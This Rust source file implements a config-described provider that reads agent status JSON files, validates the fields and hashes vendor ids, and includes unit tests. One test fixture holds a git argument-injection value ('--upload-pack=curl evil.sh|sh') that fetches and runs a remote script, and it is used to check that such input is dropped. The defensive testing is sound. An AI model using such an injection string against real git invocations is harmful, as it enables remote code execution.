//! A provider described in config rather than in Rust.
//!
//! This is what makes "agent agnostic" a property rather than a promise:
//! without it, supporting a new tool means a PR against this repo and a
//! release, and the maintainer is the bottleneck for every tool that will ever
//! exist.
//!
//! It is deliberately not a scripting language. Config says *where to look* and
//! never *what is allowed*: there is no predicate vocabulary, no comparison, no
//! regex, no arithmetic. Every value it extracts goes through the same
//! validating constructor a Rust provider would use, and `ProviderSpec` has no
//! field that could describe an allowlist — `scan` never sees the `Gate`. A
//! config file cannot widen what this tool publishes, only point at more places
//! to read.

use std::{
    collections::BTreeMap,
    path::{Path, PathBuf},
};

use jiff::{SignedDuration, Timestamp};
use serde::Deserialize;
use sha2::{Digest as _, Sha256};

use super::{
    Candidate,
    fs::{MAX_DIR_ENTRIES, read_capped},
    liveness::Liveness,
    provider::{Priority, Provider, ProviderId, ScanCtx},
};
use crate::wire::{BranchName, JobId, RunState, TaskProgress, ToolId, WireError};

/// Same cap the declared reader uses. A vendor file is not more trustworthy for
/// being someone else's.
const MAX_RECORD_BYTES: u64 = 64 * 1024;

/// Names a config block may not take, because a row claiming one of them would
/// be indistinguishable from a row this binary produced.
const RESERVED: [&str; 2] = ["declared", "unknown"];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case", deny_unknown_fields)]
pub enum Layout {
    /// One JSON file per agent, directly inside `root`. The only v1 shape.
    FilePerAgent,
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case", deny_unknown_fields)]
pub enum TimeFormat {
    #[default]
    Rfc3339,
    UnixMs,
    UnixS,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct FieldMap {
    pub work_dir: String,
    pub run_state: String,
    pub started_at: String,
    /// Defaults to `started_at`. A tool that never refreshes a record still
    /// gets a timestamp the TTL can measure from.
    #[serde(default)]
    pub updated_at: Option<String>,
    #[serde(default)]
    pub branch: Option<String>,
    #[serde(default)]
    pub pr: Option<String>,
    #[serde(default)]
    pub tasks_completed: Option<String>,
    #[serde(default)]
    pub tasks_total: Option<String>,
}

/// Vendor words to the closed set of run states. Anything unlisted becomes
/// `Unknown`, which renders as unknown rather than guessing at `working`.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct StateMap {
    #[serde(default)]
    pub working: Vec<String>,
    #[serde(default)]
    pub idle: Vec<String>,
    #[serde(default)]
    pub needs_input: Vec<String>,
    #[serde(default)]
    pub done: Vec<String>,
}

impl StateMap {
    fn resolve(&self, word: &str) -> RunState {
        let word = word.trim();
        for (states, run_state) in [
            (&self.working, RunState::Working),
            (&self.idle, RunState::Idle),
            (&self.needs_input, RunState::NeedsInput),
            (&self.done, RunState::Done),
        ] {
            if states.iter().any(|candidate| candidate == word) {
                return run_state;
            }
        }
        RunState::Unknown
    }
}

#[derive(Debug, Clone, Copy, Deserialize)]
#[serde(rename_all = "snake_case", deny_unknown_fields, tag = "kind")]
pub enum LivenessSpec {
    /// The record is live until it goes stale. No process is consulted.
    Ttl {
        #[serde(default = "default_ttl_secs")]
        ttl_secs: u64,
    },
}

impl Default for LivenessSpec {
    fn default() -> Self {
        Self::Ttl {
            ttl_secs: default_ttl_secs(),
        }
    }
}

fn default_ttl_secs() -> u64 {
    900
}

fn default_priority() -> u16 {
    Priority::GENERIC.0
}

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProviderSpec {
    /// Becomes the `ToolId` on every row this provider produces, and the
    /// suffix of its `ProviderId`.
    pub name: String,
    pub root: PathBuf,
    pub layout: Layout,
    #[serde(default = "default_priority")]
    pub priority: u16,
    #[serde(default)]
    pub time: TimeFormat,
    pub fields: FieldMap,
    #[serde(default)]
    pub run_state: StateMap,
    #[serde(default)]
    pub liveness: LivenessSpec,
}

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum SpecError {
    #[error("provider name {0:?} is reserved")]
    Reserved(String),
    #[error("provider name is not a valid tool id: {0}")]
    Name(WireError),
    #[error("provider root must be an absolute path")]
    RelativeRoot,
    #[error("providers {0:?} and {1:?} would read the same files")]
    OverlappingRoots(String, String),
    #[error("tasks_completed and tasks_total must be given together or not at all")]
    HalfATaskList,
}

/// Everything checked at config load, so a bad block is a refusal to start
/// rather than rows that quietly never appear.
pub fn validate(specs: &[ProviderSpec]) -> Result<(), SpecError> {
    let mut seen: Vec<(&str, PathBuf)> = Vec::new();
    for spec in specs {
        if RESERVED.contains(&spec.name.as_str()) {
            return Err(SpecError::Reserved(spec.name.clone()));
        }
        ToolId::try_from(spec.name.as_str()).map_err(SpecError::Name)?;
        if !spec.root.is_absolute() {
            return Err(SpecError::RelativeRoot);
        }
        if spec.fields.tasks_completed.is_some() != spec.fields.tasks_total.is_some() {
            return Err(SpecError::HalfATaskList);
        }

        // Two blocks over the same directory produce duplicate rows under
        // different tool names, and nothing downstream would dedupe them.
        for (other_name, other_root) in &seen {
            if spec.root.starts_with(other_root) || other_root.starts_with(&spec.root) {
                return Err(SpecError::OverlappingRoots(
                    (*other_name).to_owned(),
                    spec.name.clone(),
                ));
            }
        }
        seen.push((&spec.name, spec.root.clone()));
    }
    Ok(())
}

/// A `JobId` for a vendor id that was never going to be one.
///
/// `JobId` is 4-64 chars of `[a-f0-9-]`, so a tool naming runs
/// `run_2026-09-09_alpha` cannot be represented at all. The obvious workaround
/// — pass the raw value through — is worse than useless: a vendor may name a
/// run after the prompt that started it, and that would put a sentence on the
/// wire through a field that looks like an identifier. Hashing is total, stable
/// across scans, and closes that structurally, so there is no escape hatch.
///
/// The cost is a `who` row whose id matches nothing the owner can grep for.
/// `doctor` prints the raw id beside it, which is the one place local detail is
/// allowed to appear.
fn derive_id(tool: &str, raw: &str) -> Option<JobId> {
    let mut hasher = Sha256::new();
    hasher.update(tool.as_bytes());
    hasher.update([0u8]);
    hasher.update(raw.as_bytes());
    let digest = hasher.finalize();
    let hex: String = digest.iter().take(8).map(|b| format!("{b:02x}")).collect();
    JobId::try_from(hex.as_str()).ok()
}

/// Follow a dotted path through a JSON object. Literal keys only — no wildcard,
/// no index, nothing that could select more than one value.
fn look_up<'a>(value: &'a serde_json::Value, path: &str) -> Option<&'a serde_json::Value> {
    let mut cursor = value;
    for segment in path.split('.') {
        cursor = cursor.get(segment)?;
    }
    Some(cursor)
}

fn as_text<'a>(value: &'a serde_json::Value, path: &str) -> Option<&'a str> {
    look_up(value, path)?.as_str()
}

fn timestamp(value: &serde_json::Value, path: &str, format: TimeFormat) -> Option<Timestamp> {
    let found = look_up(value, path)?;
    match format {
        TimeFormat::Rfc3339 => found.as_str()?.parse().ok(),
        TimeFormat::UnixMs => Timestamp::from_millisecond(found.as_i64()?).ok(),
        TimeFormat::UnixS => Timestamp::from_second(found.as_i64()?).ok(),
    }
}

pub struct Generic {
    spec: ProviderSpec,
    tool: ToolId,
}

impl Generic {
    /// `validate` must have passed for this spec, which is where the name is
    /// checked. A name that would not parse yields no provider rather than a
    /// provider that publishes under the wrong tool.
    pub fn new(spec: ProviderSpec) -> Option<Self> {
        let tool = ToolId::try_from(spec.name.as_str()).ok()?;
        Some(Self { spec, tool })
    }

    /// The raw vendor id behind a derived one, for `doctor`. Returns the pairs
    /// this provider would produce, so the operator can map an opaque row back
    /// to a file they can open.
    pub fn raw_ids(&self) -> BTreeMap<String, String> {
        self.records()
            .into_iter()
            .filter_map(|(raw, _)| {
                derive_id(self.tool.as_str(), &raw).map(|id| (id.to_string(), raw))
            })
            .collect()
    }

    fn records(&self) -> Vec<(String, serde_json::Value)> {
        let Ok(entries) = std::fs::read_dir(&self.spec.root) else {
            return Vec::new();
        };
        let mut out = Vec::new();
        for entry in entries.flatten().take(MAX_DIR_ENTRIES) {
            let path = entry.path();
            if path.extension().is_none_or(|ext| ext != "json") {
                continue;
            }
            let Some(stem) = path.file_stem().and_then(|s| s.to_str()) else {
                continue;
            };
            let Some(bytes) = read_capped(&path, MAX_RECORD_BYTES) else {
                continue;
            };
            let Ok(value) = serde_json::from_slice::<serde_json::Value>(&bytes) else {
                continue;
            };
            out.push((stem.to_owned(), value));
        }
        out.sort_by(|a, b| a.0.cmp(&b.0));
        out
    }

    fn candidate(
        &self,
        raw_id: &str,
        value: &serde_json::Value,
        now: Timestamp,
    ) -> Option<Candidate> {
        let fields = &self.spec.fields;

        let work_dir = PathBuf::from(as_text(value, &fields.work_dir)?);
        if !work_dir.is_absolute() {
            return None;
        }

        let started_at = timestamp(value, &fields.started_at, self.spec.time)?;
        let updated_at = fields
            .updated_at
            .as_deref()
            .and_then(|path| timestamp(value, path, self.spec.time))
            .unwrap_or(started_at);

        match self.spec.liveness {
            LivenessSpec::Ttl { ttl_secs } => {
                let ttl = SignedDuration::from_secs(i64::try_from(ttl_secs).unwrap_or(i64::MAX));
                if now.duration_since(updated_at) > ttl {
                    return None;
                }
            }
        }

        let run_state = self
            .spec
            .run_state
            .resolve(as_text(value, &fields.run_state)?);

        // Every optional goes through the constructor a Rust provider would
        // use. A value the vendor supplied that does not pass is dropped, and
        // the row still publishes without it.
        let branch = fields
            .branch
            .as_deref()
            .and_then(|path| as_text(value, path))
            .and_then(|text| BranchName::try_from(text).ok());

        let pr = fields
            .pr
            .as_deref()
            .and_then(|path| look_up(value, path))
            .and_then(serde_json::Value::as_u64)
            .and_then(|n| u32::try_from(n).ok())
            .filter(|n| (1..=999_999).contains(n));

        let tasks = match (&fields.tasks_completed, &fields.tasks_total) {
            (Some(done), Some(total)) => {
                let done = look_up(value, done).and_then(serde_json::Value::as_u64);
                let total = look_up(value, total).and_then(serde_json::Value::as_u64);
                match (done, total) {
                    (Some(done), Some(total)) => TaskProgress::new(
                        u16::try_from(done).unwrap_or(u16::MAX),
                        u16::try_from(total).unwrap_or(u16::MAX),
                    )
                    .ok(),
                    _ => None,
                }
            }
            _ => None,
        };

        Some(Candidate {
            id: derive_id(self.tool.as_str(), raw_id)?,
            tool: self.tool.clone(),
            work_dir,
            session_id: None,
            children: Vec::new(),
            run_state,
            started_at,
            updated_at,
            declared_branch: branch,
            declared_pr: pr,
            tasks_hint: tasks,
        })
    }
}

impl Provider for Generic {
    fn id(&self) -> ProviderId {
        ProviderId::generic(&self.spec.name)
    }

    fn priority(&self) -> Priority {
        Priority(self.spec.priority)
    }

    fn scan(&self, ctx: &ScanCtx<'_>) -> Vec<Candidate> {
        self.records()
            .into_iter()
            // A record missing a required field is skipped; the provider still
            // reports every other row. A vendor schema change costs you rows
            // from one tool, never the snapshot.
            .filter_map(|(raw_id, value)| self.candidate(&raw_id, &value, ctx.now))
            .collect()
    }
}

/// Unused today — `LivenessSpec` has one variant, and a pid check needs the
/// process table. Kept in the signature so adding `kind = "pid"` does not
/// change the trait.
#[allow(dead_code)]
fn _procs_are_available(_procs: &dyn Liveness) {}

pub fn spec_root(spec: &ProviderSpec) -> &Path {
    &spec.root
}

#[cfg(test)]
mod tests {
    #![allow(
        clippy::unwrap_used,
        clippy::expect_used,
        clippy::panic,
        clippy::indexing_slicing
    )]

    use super::*;

    const CANARY: &str = "pasting the thread from #legal: Dart says the settlement number is 4.2M";

    struct Dir(PathBuf);

    impl Dir {
        fn new(name: &str) -> Self {
            let dir = std::env::temp_dir().join(format!("sealmesh-generic-{name}"));
            std::fs::remove_dir_all(&dir).ok();
            std::fs::create_dir_all(&dir).unwrap();
            Self(dir.canonicalize().unwrap())
        }

        fn write(&self, name: &str, value: &serde_json::Value) {
            std::fs::write(self.0.join(name), value.to_string()).unwrap();
        }
    }

    impl Drop for Dir {
        fn drop(&mut self) {
            std::fs::remove_dir_all(&self.0).ok();
        }
    }

    fn spec(root: &Path) -> ProviderSpec {
        ProviderSpec {
            name: "qwen".to_owned(),
            root: root.to_path_buf(),
            layout: Layout::FilePerAgent,
            priority: default_priority(),
            time: TimeFormat::Rfc3339,
            fields: FieldMap {
                work_dir: "dir".to_owned(),
                run_state: "status".to_owned(),
                started_at: "started".to_owned(),
                updated_at: None,
                branch: Some("git.branch".to_owned()),
                pr: Some("pull_request".to_owned()),
                tasks_completed: None,
                tasks_total: None,
            },
            run_state: StateMap {
                working: vec!["running".to_owned()],
                idle: vec!["sleeping".to_owned()],
                needs_input: Vec::new(),
                done: Vec::new(),
            },
            liveness: LivenessSpec::Ttl { ttl_secs: 900 },
        }
    }

    fn now() -> Timestamp {
        "2026-08-24T12:00:00Z".parse().unwrap()
    }

    fn scan(provider: &Generic) -> Vec<Candidate> {
        let live = std::collections::BTreeSet::new();
        let procs = super::super::liveness::ProcessTable::read();
        provider.scan(&ScanCtx {
            now: now(),
            procs: &procs,
            live_sessions: &live,
        })
    }

    #[test]
    fn a_vendor_id_that_could_be_prose_never_reaches_a_job_id() {
        // The whole reason ids are hashed. `JobId` looks like an identifier
        // field, and a tool that names a run after its prompt would otherwise
        // put a sentence on the wire through it.
        let dir = Dir::new("prose-id");
        let provider = Generic::new(spec(&dir.0)).unwrap();
        dir.write(
            &format!("{}.json", CANARY.replace(['/', ' ', ':', '#'], "-")),
            &serde_json::json!({
                "dir": "/tmp",
                "status": "running",
                "started": "2026-08-24T11:55:00Z",
            }),
        );

        let found = scan(&provider);
        assert_eq!(found.len(), 1);
        let id = found[0].id.to_string();
        assert!(!id.contains("Dart"), "{id}");
        assert!(!id.contains("settlement"), "{id}");
        assert!(
            id.chars()
                .all(|c| c.is_ascii_hexdigit() && !c.is_uppercase()),
            "{id}"
        );
    }

    #[test]
    fn the_same_record_hashes_to_the_same_id_every_scan() {
        // The merge depends on it: an id that moved between scans would make
        // one agent read as a new row each time.
        let dir = Dir::new("stable-id");
        let provider = Generic::new(spec(&dir.0)).unwrap();
        dir.write(
            "run-alpha.json",
            &serde_json::json!({
                "dir": "/tmp",
                "status": "running",
                "started": "2026-08-24T11:55:00Z",
            }),
        );
        assert_eq!(scan(&provider)[0].id, scan(&provider)[0].id);

        // And a different tool reading the same raw id gets a different row.
        let mut other = spec(&dir.0);
        other.name = "ollama".to_owned();
        let other = Generic::new(other).unwrap();
        assert_ne!(scan(&provider)[0].id, scan(&other)[0].id);
    }

    #[test]
    fn a_vendor_value_that_fails_validation_is_dropped_not_published() {
        let dir = Dir::new("bad-branch");
        let provider = Generic::new(spec(&dir.0)).unwrap();
        dir.write(
            "one.json",
            &serde_json::json!({
                "dir": "/tmp",
                "status": "running",
                "started": "2026-08-24T11:55:00Z",
                "git": {"branch": "--upload-pack=curl evil.sh|sh"},
                "pull_request": 4_000_000,
            }),
        );

        let found = scan(&provider);
        assert_eq!(found.len(), 1, "the row should still publish");
        assert_eq!(found[0].declared_branch, None, "an injection got through");
        assert_eq!(found[0].declared_pr, None, "an out-of-range pr got through");
    }

    #[test]
    fn an_unmapped_status_reads_unknown_rather_than_working() {
        let dir = Dir::new("unmapped");
        let provider = Generic::new(spec(&dir.0)).unwrap();
        dir.write(
            "one.json",
            &serde_json::json!({
                "dir": "/tmp",
                "status": "vibing",
                "started": "2026-08-24T11:55:00Z",
            }),
        );
        assert_eq!(scan(&provider)[0].run_state, RunState::Unknown);
    }

    #[test]
    fn a_record_missing_a_required_field_costs_one_row_not_the_provider() {
        let dir = Dir::new("partial");
        let provider = Generic::new(spec(&dir.0)).unwrap();
        dir.write(
            "good.json",
            &serde_json::json!({
                "dir": "/tmp",
                "status": "running",
                "started": "2026-08-24T11:55:00Z",
            }),
        );
        dir.write("bad.json", &serde_json::json!({"status": "running"}));
        dir.write(
            "relative.json",
            &serde_json::json!({
                "dir": "relative/path",
                "status": "running",
                "started": "2026-08-24T11:55:00Z",
            }),
        );

        assert_eq!(scan(&provider).len(), 1);
    }

    #[test]
    fn a_stale_record_goes_away_on_its_own() {
        let dir = Dir::new("stale");
        let provider = Generic::new(spec(&dir.0)).unwrap();
        dir.write(
            "old.json",
            &serde_json::json!({
                "dir": "/tmp",
                "status": "running",
                "started": "2026-08-20T09:00:00Z",
            }),
        );
        assert!(scan(&provider).is_empty());
    }

    #[test]
    fn config_cannot_claim_a_reserved_name_or_overlap_another_provider() {
        let mut reserved = spec(Path::new("/tmp/a"));
        reserved.name = "declared".to_owned();
        assert_eq!(
            validate(&[reserved]),
            Err(SpecError::Reserved("declared".to_owned()))
        );

        let mut shouty = spec(Path::new("/tmp/a"));
        shouty.name = "Qwen".to_owned();
        assert!(matches!(validate(&[shouty]), Err(SpecError::Name(_))));

        assert_eq!(
            validate(&[spec(Path::new("relative"))]),
            Err(SpecError::RelativeRoot)
        );

        let mut nested = spec(Path::new("/tmp/a/inner"));
        nested.name = "ollama".to_owned();
        assert!(matches!(
            validate(&[spec(Path::new("/tmp/a")), nested]),
            Err(SpecError::OverlappingRoots(_, _))
        ));

        let mut half = spec(Path::new("/tmp/a"));
        half.fields.tasks_completed = Some("todo.done".to_owned());
        assert_eq!(validate(&[half]), Err(SpecError::HalfATaskList));
    }

    #[test]
    fn a_dotted_path_cannot_select_more_than_one_value() {
        let value = serde_json::json!({"a": {"b": {"c": 7}}, "list": [1, 2, 3]});
        assert_eq!(look_up(&value, "a.b.c").and_then(|v| v.as_i64()), Some(7));
        // No index syntax, so an array element is unreachable by design.
        assert!(look_up(&value, "list.0").is_none());
        assert!(look_up(&value, "a.*.c").is_none());
        assert!(look_up(&value, "missing.path").is_none());
    }
}
